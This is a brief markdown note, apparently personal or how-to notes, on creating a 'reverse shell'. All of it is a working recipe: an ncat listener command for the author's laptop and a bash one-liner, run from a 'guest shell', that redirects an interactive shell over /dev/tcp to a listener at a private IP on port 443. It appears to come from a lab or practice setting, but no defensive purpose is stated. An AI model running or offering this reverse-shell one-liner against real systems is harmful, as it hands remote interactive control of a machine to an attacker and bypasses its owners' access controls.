# Create an ssh reverse shell 

Bash Reverse shell
https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean

Run the following on your lapptop
`ncat -nlvp 443` 

From the guest shell enter
 `bash -i &> /dev/tcp/192.168.10.211/443 0>&1`

192.168.10.211 is the listener machine



